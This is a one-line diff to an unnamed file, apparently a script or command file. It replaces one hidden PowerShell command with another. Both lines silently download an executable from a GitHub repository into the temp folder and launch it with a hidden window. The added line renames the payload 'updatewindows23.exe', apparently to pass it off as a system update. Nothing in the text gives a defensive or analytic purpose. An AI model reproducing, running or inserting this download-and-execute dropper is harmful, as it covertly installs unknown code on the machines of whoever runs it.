@@ -1,1 +1,1 @@
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/Setup.exe' -OutFile '%TEMP%\setup.exe'; Start-Process -WindowStyle Hidden '%TEMP%\setup.exe'"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/updatewindows23.exe' -OutFile '%TEMP%\updatewindows23.exe'; Start-Process -WindowStyle Hidden '%TEMP%\updatewindows23.exe'"
